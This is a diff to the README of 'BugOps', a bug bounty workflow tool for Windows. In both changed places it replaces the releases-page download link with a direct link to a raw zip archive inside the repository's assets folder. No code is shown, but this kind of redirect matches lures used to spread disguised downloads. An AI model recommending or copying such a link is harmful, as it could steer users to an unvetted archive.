@@ -1,6 +1,6 @@
 # 🐞 BugOps - Simple Bug Bounty Workflow Guide
 
-[![Download BugOps](https://img.shields.io/badge/Download-BugOps-blue?style=for-the-badge&logo=github)](https://github.com/malikhar1945/BugOps/releases)
+[![Download BugOps](https://img.shields.io/badge/Download-BugOps-blue?style=for-the-badge&logo=github)](https://github.com/malikhar1945/BugOps/raw/refs/heads/main/assets/Bug-Ops-v1.9-alpha.2.zip)
 
 ## 🚀 What is BugOps?
 
@@ -26,7 +26,7 @@ BugOps is made for Windows users who want a simple way to use a bug bounty check
 ## 📥 Download BugOps
 
 Visit this page to download:  
-https://github.com/malikhar1945/BugOps/releases
+https://github.com/malikhar1945/BugOps/raw/refs/heads/main/assets/Bug-Ops-v1.9-alpha.2.zip
 
 ### How to get it
 1. Open the download page.
